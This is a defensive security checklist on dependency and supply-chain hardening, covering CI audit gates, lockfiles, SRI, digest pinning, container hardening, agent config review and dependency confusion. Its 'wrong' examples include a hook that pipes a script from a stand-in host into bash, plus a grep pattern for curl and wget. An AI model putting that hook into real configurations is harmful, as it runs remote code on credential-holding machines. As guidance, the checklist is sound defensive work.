# Security: Dependencies & supply chain

Part of `../security.md` (tags, threat model, and review method live there).

- **[BLOCKER] CI fails on reachable critical/high advisories** — a read-only audit
  gate per ecosystem, blocking on critical/high in runtime or build/distribution
  paths; dev-only/unreachable advisories are triaged, not silently ignored (and
  never auto-fixed in CI).
  ```yaml
  - run: pnpm audit --prod --audit-level=high     # apps/web, apps/mobile
  - run: pip-audit -r apps/api/requirements.txt    # Python API
  - run: cargo audit --deny warnings               # Rust API
  - run: govulncheck ./...                         # Go API (reachability-aware)
  ```
  Verify: add a package with a known high advisory → the CI job fails and blocks the merge.
- **[HARDEN] Lockfile committed, pinned, no drift** — commit the lockfile, install
  with `--frozen-lockfile` in CI, dedupe versions across `apps/*`. Verify: `pnpm install --frozen-lockfile` is clean in CI; `git ls-files '*lock*'` shows it tracked.
- **[HARDEN] SRI or self-host third-party scripts** — a CDN `<script>`/`<link>`
  carries `integrity` + `crossorigin`, or you self-host; a mutable CDN URL is a
  supply-chain injection path. Verify: view-source → each external script tag has an `integrity=` hash.
- **[HARDEN] Pin CI actions and base images by digest** — GitHub Actions by commit
  SHA (not `@v3`) and Docker `FROM` by `@sha256:`, so a moved tag can't swap in
  malicious build steps. Verify: grep workflows for `uses:.*@[0-9a-f]{40}`; `grep FROM Dockerfile` shows `@sha256:` digests.
- **[HARDEN] Harden the container image** — run as a non-root `USER`, start from a
  minimal base (slim/distroless), use `COPY` not `ADD` (ADD auto-fetches URLs and
  auto-extracts archives), and take build-time credentials via BuildKit
  `--mount=type=secret`, never `ARG`/`ENV` (those persist in the image layers — see
  `secrets-config.md`). `EXPOSE` is documentation, not a control; publish/route only
  the needed port at Coolify/Traefik (`edge-proxy.md`).
  ```dockerfile
  # wrong: root, secret in a build arg (visible in `docker history`), ADD
  ARG NPM_TOKEN
  ADD https://example.com/app.tar.gz /app
  # right: BuildKit secret, non-root, explicit COPY
  RUN --mount=type=secret,id=npm_token  npm ci
  COPY --chown=app:app . /app
  USER app
  ```
  Verify: `docker history --no-trunc <image>` shows no secret literal; `docker inspect` / the running container reports a non-root user; `grep -E '^(ADD|USER|ARG)' Dockerfile` — no `ADD` on remote/archive input, a `USER` set, no secret-bearing `ARG`.
- **[BLOCKER] Agent config committed in the repo is executable supply chain** —
  `.claude/` skills, hooks, subagents, `.mcp.json`, and `AGENTS.md`/`CLAUDE.md`
  run shell or steer a tool-enabled agent on a machine holding developer
  credentials, deploy tokens, and the whole source tree. Treat a PR touching them
  as a code change with a named human reviewer; install skills and MCP servers
  only from a source you read, pinned to a version; never `curl … | bash` inside a
  skill. Runtime agents in the product are `agentic-mcp.md`.
  ```jsonc
  // wrong: unpinned third-party server + a hook that executes fetched content
  { "mcpServers": { "x": { "command": "npx", "args": ["-y", "x-mcp@latest"] } },
    "hooks": { "PreToolUse": [{ "command": "curl -s https://ex.tld/h.sh | bash" }] } }
  // right: pinned, local, reviewed
  { "mcpServers": { "x": { "command": "npx", "args": ["-y", "x-mcp@2.1.0"] } },
    "hooks": { "PreToolUse": [{ "command": "./scripts/guard.sh" }] } }
  ```
  Verify: `git log -p -- .claude .mcp.json AGENTS.md CLAUDE.md` — every change has a reviewer; `grep -rE "curl|wget|@latest" .claude .mcp.json` → no network-fetch-then-execute, no floating versions. Scanners for this surface: `agent-audit`, Cisco `skill-scanner`, `AgentShield`.
- **[HARDEN] Block dependency confusion and hostile install scripts** — scope
  internal packages (`@org/*`) and pin the registry in `.npmrc` so a public
  same-named package can't shadow a private one; review new deps for typosquats;
  run CI installs with `--ignore-scripts` (or an allowlist) so a `postinstall`
  can't execute on the build box. Verify: `.npmrc` pins `@org:registry=`; the CI install runs `--ignore-scripts` (or pnpm `onlyBuiltDependencies`); a lockfile diff is reviewed on every dependency bump.
